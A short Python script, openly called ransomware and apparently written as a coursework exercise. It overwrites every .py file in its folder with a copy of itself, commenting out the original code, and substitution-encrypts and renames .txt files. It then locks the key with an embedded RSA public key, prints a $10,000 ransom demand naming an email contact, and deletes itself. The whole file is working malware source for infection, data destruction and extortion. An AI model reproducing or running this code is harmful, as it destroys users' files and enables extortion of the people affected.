#!/usr/bin/env python3
import random
from base64 import b64decode, b64encode
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
import sys, glob, subprocess
from subprocess import Popen


ALL_LETTERS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

#Generate random alphabet table key for encryption
def generateKey():
	letter_lists = list(ALL_LETTERS)  
	random.shuffle(letter_lists)
	key = ''.join(letter_lists)
	return key

#Encryption
def encryptKey(eKey):
	eKey += "==" #for padding
	bKey = b64decode(eKey)
	recipient_key = "-----BEGIN PUBLIC KEY-----\n\
	MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAo7trHSMENsZ691AuUXFa\n\
	Im0+wcAalFdLvSrCiSraE/Gyd7IBobwPejcgx7Mbmd9iE4D1SN2hzCqQkg7xxy99\n\
	2HWKhMzrMwQB0nLPcJ+UdhrW8Ri2HgEYeBijXl2HsuE0uHsaDKepLgrXtUZbgVCR\n\
	Mte+PIHK2iJ9mmSjwjusqKS2Z0ac1KOVBY+/Wy1OeobtOCKyH1pwkfEnSZqRlsvR\n\
	rfnx/pKw9btCcqeGIuNWjc8F4bQhjaU52WiydBwSnCYbV7ylg8GPcOR3FswoxhwR\n\
	R6BSMB74k4hfFIu3MHNinZIqhyFQ80gCONqFHlFkZ37q3BKZZpgj6MmgQJa+Od1x\n\
	iwIDAQAB\n\
	-----END PUBLIC KEY-----"
	recipient_key = RSA.import_key(recipient_key)
	file_out = open("key.bin","wb")
	cipher_rsa = PKCS1_OAEP.new(recipient_key)
	enc_key = cipher_rsa.encrypt(bKey)
	file_out.write(enc_key)
	file_out.close()
	
#Sub Cipher
def encryptFile(contents, eKey):
	encrypted = ""
	tempA = ALL_LETTERS
	tempB = eKey
	
	for tempChar in contents:
		if tempChar.upper() in tempA:
			charIndex = tempA.find(tempChar.upper())
			if tempChar.isupper():
				encrypted += tempB[charIndex].upper()
			else:
				encrypted += tempB[charIndex].lower()
		else:
			encrypted += tempChar
		   
	return encrypted

#Replication
def replicatePy():
	found = False
	fileIn = open(sys.argv[0],'r')
	ransomware_contents = [line for (i,line) in enumerate(fileIn) if i<106]
	fileIn.close()
	for item in glob.glob("*.py"):
		fileIn = open(item,'r')
		contents = fileIn.readlines()
		contents = ['#' + line for line in contents]
		fileIn.close()
		fileOut = open(item,'w')
		fileOut.writelines(ransomware_contents)
		fileOut.writelines(contents)
		fileOut.close()
		p1 = Popen(["chmod","777",item])
		found = True
	return found
	
#txt enc
def txtEncrypt():
	found = False
	key = generateKey()
	for item in glob.glob("*.txt"):	
		encContents = ""
		fileIn = open(item,'r')
		for line in fileIn:
			encContents += encryptFile(line, key)
		fileIn.close()
		fileOut = open(item,'w')
		fileOut.writelines(encContents)
		fileOut.close()
		itemEnc = item.replace("txt", "enc")
		p1 = Popen(["mv",item, itemEnc])
		found = True
	if found == True:
		encryptKey(key)
	return found

#start
foundPy = replicatePy()
foundTxt = txtEncrypt()

if foundTxt == True:
	print("Your text files are encrypted. To decrypt them, you need to pay me $10,000 and send key.bin in your folder to tyh917@uowmail.edu.au.")
	if sys.argv[0] != "ransomware.py":
		input("\nPress 'close' or 'enter' to exit")
else:
	pass
	
if foundPy == True or foundTxt == True:
	p1 = Popen(["rm", "ransomware.py"])

